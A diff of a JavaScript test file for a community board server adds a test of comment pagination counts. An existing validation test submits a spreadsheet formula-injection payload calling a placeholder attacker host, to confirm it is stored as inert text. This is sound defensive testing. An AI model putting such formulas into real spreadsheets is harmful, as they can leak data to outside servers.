@@ -103,6 +103,12 @@ test('post editing can add, retain, and remove completed attachments',()=>{
 test('comments enforce author rights and deleted parent hides all comments',()=>{
   const s=server(),a=s.login();s.approve(a.member.id);const p=s.call('createPost',draft(),a.session).post;const d={postId:p.id,body:'댓글입니다',mutationId:randomUUID()};const c=s.call('createComment',d,a.session).comment;assert.equal(s.call('createComment',d,a.session).comment.id,c.id);const b=s.login('b','b@example.org');s.approve(b.member.id);denied(()=>s.call('updateComment',{id:c.id,version:1,body:'남의 댓글 수정'},b.session),'FORBIDDEN');s.call('deletePost',{id:p.id,version:1},a.session);denied(()=>s.call('getPost',{id:p.id},a.session),'NOT_FOUND');denied(()=>s.call('createComment',{...d,mutationId:randomUUID()},a.session),'NOT_FOUND');
 });
+test('comment creation returns its page and the current total for in-place UI updates',()=>{
+  const s=server(),a=s.login(),b=s.login('google-user-b','b@example.org');const p=s.call('createPost',draft(),a.session).post;
+  let result;
+  for(let i=0;i<31;i++) result=s.call('createComment',{postId:p.id,body:'댓글 '+i,mutationId:randomUUID()},i<15?a.session:b.session);
+  assert.equal(result.commentCount,31);assert.equal(result.commentPage,2);assert.equal(result.commentPages,2);assert.equal(result.comment.postId,p.id);
+});
 test('server rejects oversized and blank content and stores formulas as JSON text',()=>{
   const s=server(),a=s.login();s.approve(a.member.id);denied(()=>s.call('createPost',{...draft(),title:' '},a.session),'INVALID');denied(()=>s.call('createPost',{...draft(),body:'a'.repeat(10001)},a.session),'INVALID');denied(()=>s.call('startUpload',{name:'unsafe.pdf',mimeType:'application/pdf',size:1},a.session),'INVALID');denied(()=>s.call('startUpload',{name:'large.mp4',mimeType:'video/mp4',size:100*1024*1024+1},a.session),'INVALID');s.call('createPost',{...draft(),body:'=IMPORTXML("https://attacker.invalid","x")'},a.session);assert.equal(s.db.Posts[1][1][0],'{');
 });
